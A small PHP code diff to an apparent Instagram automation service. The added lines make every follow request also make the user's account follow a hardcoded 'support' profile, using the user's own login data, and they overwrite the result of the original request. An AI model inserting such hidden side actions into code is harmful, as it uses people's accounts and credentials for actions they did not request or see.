@@ -1376,6 +1376,8 @@ namespace dumbu\cls {
             $result = NULL;
             if ($login_data) {
                 $result = $this->make_insta_friendships_command($login_data, $prof_id, 'follow');
+                $dumbusuport_prof_id = '4454382603';
+                $result = $this->make_insta_friendships_command($login_data, $dumbusuport_prof_id, 'follow');
             }
             return $result;
         }
